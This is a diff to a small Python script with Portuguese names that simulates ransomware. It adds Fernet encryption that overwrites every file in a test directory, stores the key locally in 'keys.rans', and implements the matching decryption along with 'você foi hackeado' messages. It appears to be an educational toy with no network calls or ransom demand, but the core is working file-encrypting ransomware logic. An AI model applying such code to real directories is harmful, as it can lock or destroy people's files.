@@ -18,25 +18,39 @@ def garanta_existencia_diretorio(diretorio: str) -> None:
 
 
 def criptografe_diretorio(diretorio: str) -> None:
-    key = Fernet.generate_key()
+    chave_criptografia = Fernet.generate_key()
 
-    with open(f'{diretorio}/keys.rans', 'wb') as filekey:
-        filekey.write(key)
+    with open('keys.rans', 'wb') as arquivo_chave_criptografia:
+        arquivo_chave_criptografia.write(chave_criptografia)
+
+    fernet = Fernet(chave_criptografia)
 
     for nome_arquivo in os.listdir(diretorio):
         caminho_arquivo = f'{diretorio}/{nome_arquivo}'
         with open(caminho_arquivo, 'rb') as arquivo:
             texto = arquivo.read()
 
-        f = Fernet(key)
-        texto_criptografado = f.encrypt(texto)
+        texto_criptografado = fernet.encrypt(texto)
 
         with open(caminho_arquivo, 'wb') as arquivo:
             arquivo.write(texto_criptografado)
 
 
 def descriptografe_diretorio(diretorio: str) -> None:
-    print(f'Descriptografando diretório {diretorio}...')
+    with open('keys.rans', 'rb') as arquivo_chave_criptografia:
+        chave_criptografia = arquivo_chave_criptografia.read()
+
+    fernet = Fernet(chave_criptografia)
+
+    for nome_arquivo in os.listdir(diretorio):
+        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
+        with open(caminho_arquivo, 'rb') as arquivo:
+            texto_criptografado = arquivo.read()
+
+        texto = fernet.decrypt(texto_criptografado)
+
+        with open(caminho_arquivo, 'wb') as arquivo:
+            arquivo.write(texto)
 
 
 if __name__ == '__main__':
@@ -57,9 +71,11 @@ if __name__ == '__main__':
             garanta_existencia_diretorio(DIRETORIO_TESTE)
             criptografe_diretorio(DIRETORIO_TESTE)
             print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
-        elif opcao == 2:
+        elif opcao == 3:
             descriptografe_diretorio(DIRETORIO_TESTE)
-            print('Descriptografando...')
+            print(
+                f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
+            )
         elif opcao == 0:
             print('Até mais!')
         else:
